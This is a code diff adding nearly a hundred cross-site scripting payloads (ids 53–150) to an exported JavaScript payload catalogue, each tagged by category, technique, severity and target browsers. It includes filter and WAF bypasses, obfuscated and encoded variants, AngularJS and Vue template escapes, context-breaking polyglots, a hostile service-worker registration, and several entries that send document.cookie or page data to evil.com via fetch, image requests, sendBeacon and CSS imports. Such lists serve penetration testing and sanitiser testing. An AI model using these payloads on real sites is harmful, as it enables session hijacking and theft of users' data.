@@ -550,6 +550,1038 @@ export const payloads = [
     description: 'Iframe srcdoc attribute',
     severity: 'high',
     browsers: ['all']
+  },
+
+  // Additional Event Handlers
+  {
+    id: 53,
+    payload: '<select onfocus=alert(1) autofocus>',
+    category: 'event-handler',
+    technique: 'onfocus',
+    context: 'html',
+    description: 'Select element with autofocus',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 54,
+    payload: '<textarea onfocus=alert(1) autofocus>',
+    category: 'event-handler',
+    technique: 'onfocus',
+    context: 'html',
+    description: 'Textarea with autofocus',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 55,
+    payload: '<keygen onfocus=alert(1) autofocus>',
+    category: 'event-handler',
+    technique: 'onfocus',
+    context: 'html',
+    description: 'Keygen with autofocus (deprecated)',
+    severity: 'medium',
+    browsers: ['legacy']
+  },
+  {
+    id: 56,
+    payload: '<video onloadstart=alert(1)><source>',
+    category: 'event-handler',
+    technique: 'onloadstart',
+    context: 'html',
+    description: 'Video loadstart event',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 57,
+    payload: '<audio onloadstart=alert(1)><source>',
+    category: 'event-handler',
+    technique: 'onloadstart',
+    context: 'html',
+    description: 'Audio loadstart event',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 58,
+    payload: '<body onpageshow=alert(1)>',
+    category: 'event-handler',
+    technique: 'onpageshow',
+    context: 'html',
+    description: 'Page show event',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 59,
+    payload: '<body onpagehide=alert(1)>',
+    category: 'event-handler',
+    technique: 'onpagehide',
+    context: 'html',
+    description: 'Page hide event',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 60,
+    payload: '<body onbeforeunload=alert(1)>',
+    category: 'event-handler',
+    technique: 'onbeforeunload',
+    context: 'html',
+    description: 'Before unload event',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 61,
+    payload: '<body onhashchange=alert(1)>',
+    category: 'event-handler',
+    technique: 'onhashchange',
+    context: 'html',
+    description: 'Hash change event',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 62,
+    payload: '<body onpopstate=alert(1)>',
+    category: 'event-handler',
+    technique: 'onpopstate',
+    context: 'html',
+    description: 'Popstate event',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 63,
+    payload: '<form onsubmit=alert(1)><input type=submit>',
+    category: 'event-handler',
+    technique: 'onsubmit',
+    context: 'html',
+    description: 'Form submit event',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 64,
+    payload: '<input oninput=alert(1)>',
+    category: 'event-handler',
+    technique: 'oninput',
+    context: 'html',
+    description: 'Input event',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 65,
+    payload: '<input onchange=alert(1)>',
+    category: 'event-handler',
+    technique: 'onchange',
+    context: 'html',
+    description: 'Change event',
+    severity: 'medium',
+    browsers: ['all']
+  },
+
+  // More SVG Payloads
+  {
+    id: 66,
+    payload: '<svg><set attributeName=onmouseover to=alert(1)>',
+    category: 'svg',
+    technique: 'svg-set',
+    context: 'html',
+    description: 'SVG set with event',
+    severity: 'medium',
+    browsers: ['firefox']
+  },
+  {
+    id: 67,
+    payload: '<svg><discard onbegin=alert(1)>',
+    category: 'svg',
+    technique: 'svg-discard',
+    context: 'html',
+    description: 'SVG discard element',
+    severity: 'medium',
+    browsers: ['chrome', 'firefox']
+  },
+  {
+    id: 68,
+    payload: '<svg><foreignObject><body onload=alert(1)></foreignObject>',
+    category: 'svg',
+    technique: 'svg-foreignobject',
+    context: 'html',
+    description: 'SVG foreignObject with HTML',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 69,
+    payload: '<svg><use href="data:image/svg+xml,<svg id=x><script>alert(1)</script></svg>#x">',
+    category: 'svg',
+    technique: 'svg-use',
+    context: 'html',
+    description: 'SVG use with data URL',
+    severity: 'high',
+    browsers: ['chrome', 'firefox']
+  },
+  {
+    id: 70,
+    payload: '<svg><title><script>alert(1)</script></title>',
+    category: 'svg',
+    technique: 'svg-title',
+    context: 'html',
+    description: 'SVG title with script',
+    severity: 'high',
+    browsers: ['all']
+  },
+
+  // Style-based
+  {
+    id: 71,
+    payload: '<style>*{background:url("javascript:alert(1)")}</style>',
+    category: 'style',
+    technique: 'css-url',
+    context: 'html',
+    description: 'CSS background with JavaScript (IE)',
+    severity: 'low',
+    browsers: ['ie']
+  },
+  {
+    id: 72,
+    payload: '<style>@import"javascript:alert(1)";</style>',
+    category: 'style',
+    technique: 'css-import',
+    context: 'html',
+    description: 'CSS import with JavaScript',
+    severity: 'low',
+    browsers: ['ie']
+  },
+  {
+    id: 73,
+    payload: '<style>body{x:expression(alert(1))}</style>',
+    category: 'style',
+    technique: 'css-expression',
+    context: 'html',
+    description: 'CSS expression (IE)',
+    severity: 'low',
+    browsers: ['ie']
+  },
+  {
+    id: 74,
+    payload: '<div style="background:url(javascript:alert(1))">',
+    category: 'style',
+    technique: 'inline-style',
+    context: 'html',
+    description: 'Inline style with JavaScript (IE)',
+    severity: 'low',
+    browsers: ['ie']
+  },
+  {
+    id: 75,
+    payload: '<link rel=stylesheet href="javascript:alert(1)">',
+    category: 'style',
+    technique: 'link-stylesheet',
+    context: 'html',
+    description: 'Link stylesheet with JavaScript',
+    severity: 'medium',
+    browsers: ['ie']
+  },
+
+  // XML-based
+  {
+    id: 76,
+    payload: '<math><mi xlink:href="data:x,<script>alert(1)</script>">',
+    category: 'xml',
+    technique: 'mathml',
+    context: 'html',
+    description: 'MathML with data URL',
+    severity: 'medium',
+    browsers: ['firefox']
+  },
+  {
+    id: 77,
+    payload: '<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="data:text/xml,<xsl:stylesheet version=\\"1.0\\" xmlns:xsl=\\"http://www.w3.org/1999/XSL/Transform\\"><xsl:template match=\\"/\\"><script>alert(1)</script></xsl:template></xsl:stylesheet>"?>',
+    category: 'xml',
+    technique: 'xsl',
+    context: 'xml',
+    description: 'XML with XSL stylesheet',
+    severity: 'high',
+    browsers: ['firefox', 'ie']
+  },
+  {
+    id: 78,
+    payload: '<xml><a xmlns:a="http://www.w3.org/1999/xhtml"><a:body onload="alert(1)"/>',
+    category: 'xml',
+    technique: 'xmlns',
+    context: 'html',
+    description: 'XML namespace injection',
+    severity: 'medium',
+    browsers: ['ie']
+  },
+
+  // Protocol Handlers
+  {
+    id: 79,
+    payload: '<a href="vbscript:msgbox(1)">Click</a>',
+    category: 'protocol',
+    technique: 'vbscript',
+    context: 'html',
+    description: 'VBScript protocol (IE)',
+    severity: 'medium',
+    browsers: ['ie']
+  },
+  {
+    id: 80,
+    payload: '<a href="livescript:alert(1)">Click</a>',
+    category: 'protocol',
+    technique: 'livescript',
+    context: 'html',
+    description: 'LiveScript protocol (legacy)',
+    severity: 'low',
+    browsers: ['netscape']
+  },
+  {
+    id: 81,
+    payload: '<a href="mocha:alert(1)">Click</a>',
+    category: 'protocol',
+    technique: 'mocha',
+    context: 'html',
+    description: 'Mocha protocol (legacy)',
+    severity: 'low',
+    browsers: ['netscape']
+  },
+
+  // More WAF Bypasses
+  {
+    id: 82,
+    payload: '<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>',
+    category: 'waf-bypass',
+    technique: 'unicode-escape',
+    context: 'html',
+    description: 'Unicode escaped function name',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 83,
+    payload: '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
+    category: 'waf-bypass',
+    technique: 'base64-eval',
+    context: 'html',
+    description: 'Base64 encoded eval',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 84,
+    payload: '<img src=x onerror=window[`al`+`ert`](1)>',
+    category: 'waf-bypass',
+    technique: 'string-concat',
+    context: 'html',
+    description: 'String concatenation bypass',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 85,
+    payload: '<img src=x onerror=[1].find(alert)>',
+    category: 'waf-bypass',
+    technique: 'array-find',
+    context: 'html',
+    description: 'Array find method',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 86,
+    payload: '<img src=x onerror=top[`al`+`ert`](1)>',
+    category: 'waf-bypass',
+    technique: 'top-window',
+    context: 'html',
+    description: 'Top window reference',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 87,
+    payload: '<img src=x onerror=self[`al`+`ert`](1)>',
+    category: 'waf-bypass',
+    technique: 'self-window',
+    context: 'html',
+    description: 'Self window reference',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 88,
+    payload: '<img src=x onerror=parent[`al`+`ert`](1)>',
+    category: 'waf-bypass',
+    technique: 'parent-window',
+    context: 'html',
+    description: 'Parent window reference',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 89,
+    payload: '<img src=x onerror=frames[`al`+`ert`](1)>',
+    category: 'waf-bypass',
+    technique: 'frames-window',
+    context: 'html',
+    description: 'Frames window reference',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 90,
+    payload: '<img src=x onerror=globalThis[`al`+`ert`](1)>',
+    category: 'waf-bypass',
+    technique: 'globalthis',
+    context: 'html',
+    description: 'GlobalThis reference',
+    severity: 'medium',
+    browsers: ['modern']
+  },
+
+  // Obfuscation
+  {
+    id: 91,
+    payload: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>',
+    category: 'obfuscation',
+    technique: 'decimal-entities',
+    context: 'html',
+    description: 'Decimal HTML entities',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 92,
+    payload: '<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>',
+    category: 'obfuscation',
+    technique: 'hex-entities',
+    context: 'html',
+    description: 'Hexadecimal HTML entities',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 93,
+    payload: '<img src=x onerror="&#0000097&#0000108&#0000101&#0000114&#0000116(1)">',
+    category: 'obfuscation',
+    technique: 'padded-entities',
+    context: 'html',
+    description: 'Padded HTML entities',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 94,
+    payload: '<IMG SRC=x ONERROR=ALERT(1)>',
+    category: 'obfuscation',
+    technique: 'uppercase',
+    context: 'html',
+    description: 'Uppercase tag and attribute',
+    severity: 'low',
+    browsers: ['all']
+  },
+  {
+    id: 95,
+    payload: '<ImG sRc=x OnErRoR=aLeRt(1)>',
+    category: 'obfuscation',
+    technique: 'mixedcase',
+    context: 'html',
+    description: 'Mixed case',
+    severity: 'low',
+    browsers: ['all']
+  },
+
+  // Whitespace and Newline Tricks
+  {
+    id: 96,
+    payload: '<img\nsrc=x\nonerror=alert(1)>',
+    category: 'bypass',
+    technique: 'newline',
+    context: 'html',
+    description: 'Newline between attributes',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 97,
+    payload: '<img\tsrc=x\tonerror=alert(1)>',
+    category: 'bypass',
+    technique: 'tab',
+    context: 'html',
+    description: 'Tab between attributes',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 98,
+    payload: '<img/src=x/onerror=alert(1)>',
+    category: 'bypass',
+    technique: 'slash',
+    context: 'html',
+    description: 'Slash separator',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 99,
+    payload: '<img src=x onerror=ale\\u0072t(1)>',
+    category: 'bypass',
+    technique: 'unicode-escape-partial',
+    context: 'html',
+    description: 'Partial Unicode escape',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 100,
+    payload: '<img src=x onerror=al\\ert(1)>',
+    category: 'bypass',
+    technique: 'backslash',
+    context: 'html',
+    description: 'Backslash in function name',
+    severity: 'low',
+    browsers: ['all']
+  },
+
+  // Context-Specific
+  {
+    id: 101,
+    payload: '"-alert(1)-"',
+    category: 'javascript',
+    technique: 'string-context',
+    context: 'javascript',
+    description: 'Inside double quotes',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 102,
+    payload: '\'-alert(1)-\'',
+    category: 'javascript',
+    technique: 'string-context',
+    context: 'javascript',
+    description: 'Inside single quotes',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 103,
+    payload: '`-alert(1)-`',
+    category: 'javascript',
+    technique: 'template-literal',
+    context: 'javascript',
+    description: 'Inside template literal',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 104,
+    payload: '};alert(1);//',
+    category: 'javascript',
+    technique: 'object-break',
+    context: 'javascript',
+    description: 'Break out of object',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 105,
+    payload: ']);alert(1);//',
+    category: 'javascript',
+    technique: 'array-break',
+    context: 'javascript',
+    description: 'Break out of array',
+    severity: 'high',
+    browsers: ['all']
+  },
+
+  // Framework-Specific
+  {
+    id: 106,
+    payload: '{{constructor.constructor(\'alert(1)\')()}}',
+    category: 'framework',
+    technique: 'angular-sandbox',
+    context: 'html',
+    description: 'AngularJS sandbox escape (old)',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 107,
+    payload: '{{$on.constructor(\'alert(1)\')()}}',
+    category: 'framework',
+    technique: 'angular-scope',
+    context: 'html',
+    description: 'AngularJS scope escape',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 108,
+    payload: '<div ng-app ng-csp><input autofocus ng-focus="$event.view.alert(1)">',
+    category: 'framework',
+    technique: 'angular-csp',
+    context: 'html',
+    description: 'AngularJS CSP bypass',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 109,
+    payload: '{{_openBlock.constructor(\'alert(1)\')()}}',
+    category: 'framework',
+    technique: 'vue-template',
+    context: 'html',
+    description: 'Vue.js template injection',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 110,
+    payload: '<%= 7*7 %>',
+    category: 'framework',
+    technique: 'ejs-template',
+    context: 'html',
+    description: 'EJS template injection test',
+    severity: 'medium',
+    browsers: ['all']
+  },
+
+  // Mobile Browser Specific
+  {
+    id: 111,
+    payload: '<marquee onstart=alert(1)>',
+    category: 'mobile',
+    technique: 'marquee',
+    context: 'html',
+    description: 'Marquee on mobile browsers',
+    severity: 'medium',
+    browsers: ['mobile-chrome', 'mobile-safari']
+  },
+  {
+    id: 112,
+    payload: '<isindex type=image src=x onerror=alert(1)>',
+    category: 'mobile',
+    technique: 'isindex',
+    context: 'html',
+    description: 'Isindex with image type',
+    severity: 'low',
+    browsers: ['legacy']
+  },
+
+  // Less Common Tags
+  {
+    id: 113,
+    payload: '<bgsound src=javascript:alert(1)>',
+    category: 'advanced',
+    technique: 'bgsound',
+    context: 'html',
+    description: 'BGSound tag (IE)',
+    severity: 'medium',
+    browsers: ['ie']
+  },
+  {
+    id: 114,
+    payload: '<blink>test</blink>',
+    category: 'advanced',
+    technique: 'blink',
+    context: 'html',
+    description: 'Blink tag (deprecated)',
+    severity: 'low',
+    browsers: ['legacy']
+  },
+  {
+    id: 115,
+    payload: '<applet code="JavaScript:alert(1)">',
+    category: 'advanced',
+    technique: 'applet',
+    context: 'html',
+    description: 'Applet tag',
+    severity: 'medium',
+    browsers: ['legacy']
+  },
+  {
+    id: 116,
+    payload: '<layer onmouseover=alert(1)>Click</layer>',
+    category: 'advanced',
+    technique: 'layer',
+    context: 'html',
+    description: 'Layer tag (Netscape)',
+    severity: 'low',
+    browsers: ['netscape']
+  },
+  {
+    id: 117,
+    payload: '<ilayer onmouseover=alert(1)>Click</ilayer>',
+    category: 'advanced',
+    technique: 'ilayer',
+    context: 'html',
+    description: 'ILayer tag (Netscape)',
+    severity: 'low',
+    browsers: ['netscape']
+  },
+
+  // Data URI Variations
+  {
+    id: 118,
+    payload: '<iframe src="data:text/html,<script>alert(1)</script>">',
+    category: 'data-uri',
+    technique: 'data-html',
+    context: 'html',
+    description: 'Data URI with HTML',
+    severity: 'critical',
+    browsers: ['all']
+  },
+  {
+    id: 119,
+    payload: '<object data="data:text/html,<script>alert(1)</script>">',
+    category: 'data-uri',
+    technique: 'data-object',
+    context: 'html',
+    description: 'Object with data URI',
+    severity: 'critical',
+    browsers: ['all']
+  },
+  {
+    id: 120,
+    payload: '<embed src="data:text/html,<script>alert(1)</script>">',
+    category: 'data-uri',
+    technique: 'data-embed',
+    context: 'html',
+    description: 'Embed with data URI',
+    severity: 'critical',
+    browsers: ['all']
+  },
+  {
+    id: 121,
+    payload: '<script src="data:text/javascript,alert(1)"></script>',
+    category: 'data-uri',
+    technique: 'data-script',
+    context: 'html',
+    description: 'Script with data URI',
+    severity: 'critical',
+    browsers: ['firefox']
+  },
+
+  // Comment-Based
+  {
+    id: 122,
+    payload: '<!--<script>alert(1)</script>-->',
+    category: 'comment',
+    technique: 'comment-script',
+    context: 'html',
+    description: 'Script inside HTML comment',
+    severity: 'low',
+    browsers: ['ie']
+  },
+  {
+    id: 123,
+    payload: '<!--[if gte IE 4]><script>alert(1)</script><![endif]-->',
+    category: 'comment',
+    technique: 'conditional-comment',
+    context: 'html',
+    description: 'IE conditional comment',
+    severity: 'medium',
+    browsers: ['ie']
+  },
+
+  // Meta Refresh
+  {
+    id: 124,
+    payload: '<meta http-equiv="refresh" content="0;javascript:alert(1)">',
+    category: 'meta',
+    technique: 'meta-refresh-js',
+    context: 'html',
+    description: 'Meta refresh with JavaScript',
+    severity: 'high',
+    browsers: ['ie']
+  },
+
+  // More Polyglots
+  {
+    id: 125,
+    payload: '">\'><script>alert(1)</script>',
+    category: 'polyglot',
+    technique: 'attribute-break',
+    context: 'multi',
+    description: 'Break attribute and inject script',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 126,
+    payload: '</script><script>alert(1)</script>',
+    category: 'polyglot',
+    technique: 'script-close',
+    context: 'multi',
+    description: 'Close script and inject new',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 127,
+    payload: '</style><script>alert(1)</script>',
+    category: 'polyglot',
+    technique: 'style-close',
+    context: 'multi',
+    description: 'Close style and inject script',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 128,
+    payload: '</title><script>alert(1)</script>',
+    category: 'polyglot',
+    technique: 'title-close',
+    context: 'multi',
+    description: 'Close title and inject script',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 129,
+    payload: '</textarea><script>alert(1)</script>',
+    category: 'polyglot',
+    technique: 'textarea-close',
+    context: 'multi',
+    description: 'Close textarea and inject script',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 130,
+    payload: '</noscript><script>alert(1)</script>',
+    category: 'polyglot',
+    technique: 'noscript-close',
+    context: 'multi',
+    description: 'Close noscript and inject script',
+    severity: 'high',
+    browsers: ['all']
+  },
+
+  // RegEx Bypasses
+  {
+    id: 131,
+    payload: '<script>alert(1)//\\',
+    category: 'bypass',
+    technique: 'comment-escape',
+    context: 'html',
+    description: 'Comment with escape',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 132,
+    payload: '<script>/**/alert(1)</script>',
+    category: 'bypass',
+    technique: 'comment-padding',
+    context: 'html',
+    description: 'Comment padding',
+    severity: 'low',
+    browsers: ['all']
+  },
+
+  // Hash/Fragment
+  {
+    id: 133,
+    payload: '#<img src=x onerror=alert(1)>',
+    category: 'dom',
+    technique: 'hash',
+    context: 'dom',
+    description: 'Hash-based DOM XSS',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 134,
+    payload: '?q=<script>alert(1)</script>',
+    category: 'dom',
+    technique: 'query',
+    context: 'dom',
+    description: 'Query parameter DOM XSS',
+    severity: 'high',
+    browsers: ['all']
+  },
+
+  // Click/Interaction Based
+  {
+    id: 135,
+    payload: '<a href="javascript:alert(1)">Click me</a>',
+    category: 'interaction',
+    technique: 'href-click',
+    context: 'html',
+    description: 'Requires user click',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 136,
+    payload: '<form><button formaction=javascript:alert(1)>Click</button>',
+    category: 'interaction',
+    technique: 'formaction-click',
+    context: 'html',
+    description: 'Formaction requires click',
+    severity: 'medium',
+    browsers: ['all']
+  },
+
+  // Content-Type Specific
+  {
+    id: 137,
+    payload: '<script>alert(1)</script>',
+    category: 'content-type',
+    technique: 'xhtml',
+    context: 'xhtml',
+    description: 'XHTML context',
+    severity: 'high',
+    browsers: ['all']
+  },
+
+  // More Modern Techniques
+  {
+    id: 138,
+    payload: '<script>fetch("//evil.com?"+document.cookie)</script>',
+    category: 'modern',
+    technique: 'fetch-exfil',
+    context: 'html',
+    description: 'Fetch API exfiltration',
+    severity: 'critical',
+    browsers: ['all']
+  },
+  {
+    id: 139,
+    payload: '<script>new Image().src="//evil.com?"+document.cookie</script>',
+    category: 'modern',
+    technique: 'image-exfil',
+    context: 'html',
+    description: 'Image-based exfiltration',
+    severity: 'critical',
+    browsers: ['all']
+  },
+  {
+    id: 140,
+    payload: '<script>navigator.sendBeacon("//evil.com",document.cookie)</script>',
+    category: 'modern',
+    technique: 'beacon-exfil',
+    context: 'html',
+    description: 'Beacon API exfiltration',
+    severity: 'critical',
+    browsers: ['all']
+  },
+  {
+    id: 141,
+    payload: '<script>XMLHttpRequest.prototype.open=function(){alert(1)}</script>',
+    category: 'modern',
+    technique: 'xhr-hijack',
+    context: 'html',
+    description: 'XHR prototype hijacking',
+    severity: 'critical',
+    browsers: ['all']
+  },
+  {
+    id: 142,
+    payload: '<script>Object.defineProperty(document,"cookie",{get:function(){alert(1)}})</script>',
+    category: 'modern',
+    technique: 'cookie-getter',
+    context: 'html',
+    description: 'Cookie getter override',
+    severity: 'critical',
+    browsers: ['all']
+  },
+
+  // Service Worker
+  {
+    id: 143,
+    payload: '<script>navigator.serviceWorker.register("evil.js")</script>',
+    category: 'modern',
+    technique: 'service-worker',
+    context: 'html',
+    description: 'Service worker registration',
+    severity: 'critical',
+    browsers: ['modern']
+  },
+
+  // Timing Attacks
+  {
+    id: 144,
+    payload: '<script>performance.mark("xss")</script>',
+    category: 'modern',
+    technique: 'performance-api',
+    context: 'html',
+    description: 'Performance timing',
+    severity: 'low',
+    browsers: ['all']
+  },
+
+  // Additional Attribute Injection
+  {
+    id: 145,
+    payload: '" onfocus=alert(1) autofocus="',
+    category: 'attribute',
+    technique: 'attribute-injection',
+    context: 'attribute',
+    description: 'Inject event attribute',
+    severity: 'high',
+    browsers: ['all']
+  },
+  {
+    id: 146,
+    payload: '" onmouseover=alert(1) "',
+    category: 'attribute',
+    technique: 'mouseover-injection',
+    context: 'attribute',
+    description: 'Mouse event injection',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 147,
+    payload: '" onbegin=alert(1) "',
+    category: 'attribute',
+    technique: 'onbegin-injection',
+    context: 'attribute',
+    description: 'Begin event injection',
+    severity: 'medium',
+    browsers: ['all']
+  },
+
+  // WebAssembly
+  {
+    id: 148,
+    payload: '<script>WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0]))</script>',
+    category: 'modern',
+    technique: 'wasm',
+    context: 'html',
+    description: 'WebAssembly instantiation',
+    severity: 'high',
+    browsers: ['modern']
+  },
+
+  // CSS Injection for Data Exfil
+  {
+    id: 149,
+    payload: '<style>@import url(//evil.com/?data);</style>',
+    category: 'css',
+    technique: 'css-import-exfil',
+    context: 'html',
+    description: 'CSS import for data exfil',
+    severity: 'medium',
+    browsers: ['all']
+  },
+  {
+    id: 150,
+    payload: '<style>*{background:url(//evil.com/?data)}</style>',
+    category: 'css',
+    technique: 'css-bg-exfil',
+    context: 'html',
+    description: 'CSS background for data exfil',
+    severity: 'medium',
+    browsers: ['all']
   }
 ];
 
@@ -569,7 +1601,19 @@ export const categories = [
   { id: 'waf-bypass', name: 'WAF Bypasses', count: payloads.filter(p => p.category === 'waf-bypass').length },
   { id: 'advanced', name: 'Advanced', count: payloads.filter(p => p.category === 'advanced').length },
   { id: 'legacy', name: 'IE/Legacy', count: payloads.filter(p => p.category === 'legacy').length },
-  { id: 'modern', name: 'Modern', count: payloads.filter(p => p.category === 'modern').length }
+  { id: 'modern', name: 'Modern', count: payloads.filter(p => p.category === 'modern').length },
+  { id: 'style', name: 'Style/CSS', count: payloads.filter(p => p.category === 'style').length },
+  { id: 'xml', name: 'XML-based', count: payloads.filter(p => p.category === 'xml').length },
+  { id: 'protocol', name: 'Protocol Handlers', count: payloads.filter(p => p.category === 'protocol').length },
+  { id: 'obfuscation', name: 'Obfuscation', count: payloads.filter(p => p.category === 'obfuscation').length },
+  { id: 'framework', name: 'Framework-Specific', count: payloads.filter(p => p.category === 'framework').length },
+  { id: 'mobile', name: 'Mobile Browsers', count: payloads.filter(p => p.category === 'mobile').length },
+  { id: 'data-uri', name: 'Data URIs', count: payloads.filter(p => p.category === 'data-uri').length },
+  { id: 'comment', name: 'Comment-based', count: payloads.filter(p => p.category === 'comment').length },
+  { id: 'meta', name: 'Meta Tags', count: payloads.filter(p => p.category === 'meta').length },
+  { id: 'interaction', name: 'User Interaction', count: payloads.filter(p => p.category === 'interaction').length },
+  { id: 'content-type', name: 'Content-Type', count: payloads.filter(p => p.category === 'content-type').length },
+  { id: 'css', name: 'CSS Injection', count: payloads.filter(p => p.category === 'css').length }
 ];
 
 export const getPayloadsByCategory = (category) => {
